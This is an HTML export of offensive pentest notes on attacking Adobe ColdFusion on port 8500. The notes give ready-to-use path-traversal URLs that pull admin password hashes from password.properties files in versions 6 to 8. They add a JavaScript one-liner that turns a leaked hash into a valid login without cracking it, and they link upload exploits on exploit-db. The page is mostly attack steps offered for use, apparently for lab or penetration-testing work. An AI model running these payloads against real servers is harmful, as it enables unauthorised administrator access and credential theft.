<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Vulns</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Port 8500 - Adobe ColdFusion - Vulns</h1></strong><br /><strong>Links</strong><br />â€¢ <a href="https://nets.ec/Coldfusion_hacking">https://nets.ec/Coldfusion_hacking</a><br /><br /><strong><h2>## LFI to extract password hashes</h2></strong><br /><a href="https://nets.ec/Coldfusion_hacking#Remote_File_Disclosure_of_Password_Hashes">https://nets.ec/Coldfusion_hacking#Remote_File_Disclosure_of_Password_Hashes</a><br />You can use LFI to extract admin password hashes.<br /><br />The site in question must have an ColdFusion Administrator available. <br />By default, it&#39;s mapped to <code>CFIDE/administrator/enter.cfm</code> <br />If it returns <code>500 Forbidden</code>, switch to <code>HTTPS</code>. <br />Alternatively, use the IP and not the hostname. <br /><br />Once at the ColdFusion administrator, verify it is either version 7 or 8. <br />Then, try the following injections:<br /><br /><table class="table"><tr><th>LFI</th><th> Affects</th></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%00en</td><td> ColdFusion 6</td></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%00en</td><td> ColdFusion 7</td></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en</td><td> ColdFusion 8</td></tr><tr><td> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%00en</td><td> All versions</td></tr></table><br /><br />A SHA1 hash of the admin pass will be printed to the screen.<br /><a href=""><img src="images/147-1.png" alt="images/147-1.png" /></a><br /><br />You can crack the hash using a site like <code>hashkiller.co.uk</code><br /><br /><strong><h3>### Can&#39;t crack the leaked SHA1 hash?</h3></strong><br />Adobe ColdFusion uses HMAC to authenticate user&#39;s passwords when logging in. <br />The salt for this HMAC hash is configured to change every 30 seconds.<br /><br />Due to a second security advisory, you can bypass password authentication using the hash alone. <br />Simply paste the SHA1 hash into the admin password form and run this via your address bar: <br /><div class="codebox"><div class="codebox">javascript:alert(hex_hmac_sha1(document.loginform.salt.value,document.loginform.cfadminPassword.value))</div></div><br /><br />You will get a javascript alert with the HMACed hash.<br />Log in with this HMACed hash as the password.<br /><br />If you were quick enough (under 30 seconds, I think?), you&#39;ll be logged in as admin.<br />Check <a href="https://nets.ec/Coldfusion_hacking">https://nets.ec/Coldfusion_hacking</a> if confused.<br /><br /><strong><h2>## Upload File Vulnerability</h2></strong><br />Check the URLs of both the exploits here (both for ColdFusion 8)<br /><a href="https://www.exploit-db.com/exploits/16788">https://www.exploit-db.com/exploits/16788</a><br /><a href="https://www.exploit-db.com/exploits/45979">https://www.exploit-db.com/exploits/45979</a></div>
</body>
</html>
